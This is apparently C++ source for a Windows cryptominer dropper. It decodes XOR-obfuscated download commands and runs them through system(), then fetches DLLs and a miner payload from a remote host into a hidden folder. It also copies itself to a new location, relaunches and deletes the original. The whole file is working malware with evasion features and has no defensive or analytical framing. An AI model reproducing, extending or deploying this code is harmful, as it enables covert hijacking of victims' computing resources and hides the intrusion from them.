#include "includes.h"


class FILE_HANDLER{
private:
	string	XOR(string toEncrypt) {
		char key[] = { ' ' ,'.' , '_' , '&*' };
		string output = toEncrypt;
		for (int i = 0; i < toEncrypt.size(); i++)
			output[i] = toEncrypt[i] ^ key[i % (sizeof(key) / sizeof(char))];

		return output;
	}
	string	hex_to_string(const string& input)
	{
		static const char* const lut = "0123456789ABCDEF";
		size_t len = input.length();
		if (len & 1) throw std::invalid_argument("odd length");

		std::string output;
		output.reserve(len / 2);
		for (size_t i = 0; i < len; i += 2)
		{
			char a = input[i];
			const char* p = std::lower_bound(lut, lut + 16, a);
			if (*p != a) throw std::invalid_argument("not a hex digit");

			char b = input[i + 1];
			const char* q = std::lower_bound(lut, lut + 16, b);
			if (*q != b) throw std::invalid_argument("not a hex digit");

			output.push_back(((p - lut) << 4) | (q - lut));
		}
		return output;
	}
	void	MakeFolder(const char* path) {
		CreateDirectory(path, NULL);
	}
	void	Copy(const char *SRC, const char* DEST) {
		ifstream src(SRC, ios::binary);
		ofstream dest(DEST, ios::binary);
		dest << src.rdbuf();
	}
	void	URLDownload(string url, string download_path) {

		string command = XOR(hex_to_string("5041284F525D374F4C427F07430E7D026E4B28076F4C354F435A7F79595D2B4F4D00114F5400084F426D334345402B030E6A305D4E42304B4468364645060308")) + url + XOR(hex_to_string("7C0C730A7C0C")) + download_path + XOR(hex_to_string("7C0C76")) + XOR(hex_to_string("02"));
		system(command.c_str());
		std::ifstream file(download_path.c_str());
		if (is_empty(file) == true) {
			remove(download_path.c_str());
		}
	}
	int		IsExist(const string& name) {
		ifstream f(name.c_str());
		return f.good();
	}
	void	MakeHiddenFolder(const char* path) {
		SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN);
	}
	bool	dirExists(const string& dirName_in)
	{
		DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
		if (ftyp == INVALID_FILE_ATTRIBUTES)
			return false;  //something is wrong with your path!

		if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
			return true;   // this is a directory!

		return false;    // this is not a directory!
	}
public:
	bool	is_empty(std::ifstream& pFile)
	{
		return pFile.peek() == std::ifstream::traits_type::eof();
	}
	int		init_files(string installtion_path, string Host, string miner_name) {
		cout << "[-] Downloading files \n";
		if (!IsExist(installtion_path)) {
			MakeFolder(installtion_path.c_str());
			MakeFolder((installtion_path + "platform").c_str());
			MakeHiddenFolder(installtion_path.c_str());
		}

		std::ifstream up(installtion_path + "up.txt");
		URLDownload(Host + "up.txt", installtion_path + "up.txt");

		if (!IsExist(installtion_path + "up.txt") || is_empty(up)) {
			cout << "[*] Host maybe down ! \n[*] if this is the first time you see this message ignore it if not the Host is really down\n";
			return 0;
		}
		cout << "[*] Host is up\n";
		if (!IsExist(installtion_path + "vccorlib110.dll")) {
			URLDownload(Host + "vccorlib110.dll", installtion_path + "vccorlib110.dll");
		}
		if (!IsExist(installtion_path + "Qt5Core.dll")) {
			URLDownload(Host + "Qt5Core.dll", installtion_path + "Qt5Core.dll");
		}
		if (!IsExist(installtion_path + "Qt5Network.dll")) {
			URLDownload(Host + "Qt5Network.dll", installtion_path + "Qt5Network.dll");
		}
		if (!IsExist(installtion_path + "msvcr110.dll")) {
			URLDownload(Host + "msvcr110.dll", installtion_path + "msvcr110.dll");
		}
		if (!IsExist(installtion_path + "msvcp110.dll")) {
			URLDownload(Host + "msvcp110.dll", installtion_path + "msvcp110.dll");
		}
		if (!IsExist(installtion_path + "libeay32.dll")) {
			URLDownload(Host + "libeay32.dll", installtion_path + "libeay32.dll");
		}
		if (!IsExist(installtion_path + "cudart32_60.dll")) {
			URLDownload(Host + "cudart32_60.dll", installtion_path + "cudart32_60.dll");
		}
		if (!IsExist(installtion_path + "ssleay32.dll")) {
			URLDownload(Host + "ssleay32.dll", installtion_path + "ssleay32.dll");
		}
		if (!IsExist(installtion_path + "Qt5WebSockets.dll")) {
			URLDownload(Host + "Qt5WebSockets.dll", installtion_path + "Qt5WebSockets.dll");
		}
		if (!IsExist(installtion_path + "platform/qwindows.dll")) {
			URLDownload(Host + "qwindows.dll", installtion_path + "platform/qwindows.dll");
		}
		if (!IsExist(installtion_path + miner_name)) {
			URLDownload(Host + "Miner.dll", installtion_path + miner_name);
		}
		cout << "[-] Finished \n";
		return 1;
	}
	int		safe_move(const char* new_path, string name, string lock_name) {
		if (!dirExists(new_path)) { CreateDirectory(new_path, NULL); }
		char current_path[_MAX_PATH + 1];
		GetModuleFileName(NULL, current_path, _MAX_PATH);
		if (IsExist(string(new_path) + lock_name)) {
			if ((string(new_path) + name).c_str() != string(current_path)) { return 0; }
			ifstream t((string(new_path) + lock_name).c_str());
			string str((istreambuf_iterator<char>(t)), istreambuf_iterator<char>());
			t.close();
			remove(str.c_str());
			remove((string(new_path) + lock_name).c_str());
			return 1;
		}
		else {
			if ((string(new_path) + name).c_str() == string(current_path)) { return 1; }
			else {
				ofstream lock;
				lock.open((string(new_path) + lock_name).c_str());
				lock << current_path;
				lock.close();
				Copy(current_path, (string(new_path) + name).c_str());
				system(("start " + string(new_path) + name).c_str());
				exit(0);
			}

		}

	}

};